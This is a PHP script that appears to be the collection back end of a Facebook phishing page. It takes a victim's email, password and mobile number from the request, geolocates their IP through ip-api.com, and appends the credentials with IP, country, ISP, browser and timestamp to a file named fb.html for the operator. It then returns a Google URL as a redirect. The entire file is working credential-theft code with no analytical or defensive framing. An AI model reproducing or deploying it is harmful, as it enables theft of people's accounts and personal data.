<?php

    $email = $_GET['email'];
    $pass = $_GET['pass'];
    $mob = $_GET['mob'];

    //echo $email.' - '.$pass;

    date_default_timezone_set("africa/cairo");

    function getUserIpAddr(){
        if(!empty($_SERVER['HTTP_CLIENT_IP'])){
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }else{
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

    $ip = getUserIpAddr();
    $api = unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
    $location = $api['country'].' - '.$api['city'];
    $isp = $api['isp'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $time =  $date = date('d/m/Y h:i:s A', time());

    $file = file_get_contents('fb.html');
    $data = fopen('fb.html', 'a');

    if(!empty($email) && !empty($pass)) {
        if (!file_exists('fb.html')) {
            //echo 'No Data...';
            $data;
        }else {
            $count = count(explode('facebook', strtolower($file)));

            if($count <= 1) {
                $meta = '<meta charset="UTF-8" />';
            }else {
                $meta = '';
            }

            fwrite($data, $meta.'<pre>----------------------------------------------<font color="#ff4757">('.$count.')</font>----------------------------------------------</pre><pre>| Facebook</pre><pre style="color:#5352ed;">| Email : '.$email.'</pre><pre style="color:#05c46b;">| Password : '.$pass.'</pre><pre style="color:#05c46b;">| Mobile : '.$mob.'</pre><pre>| ==========Info==========</pre><pre>| IP : '.$ip.'</pre><pre>| COUNTRY : '.$location.'</pre><pre>| HOST : '.$isp.'</pre><pre>| BROWSER : '.$useragent.'</pre><pre>| DATE : '.$time.'</pre>');
            fclose($data);

            echo 'https://www.google.com';
        }
    }


?>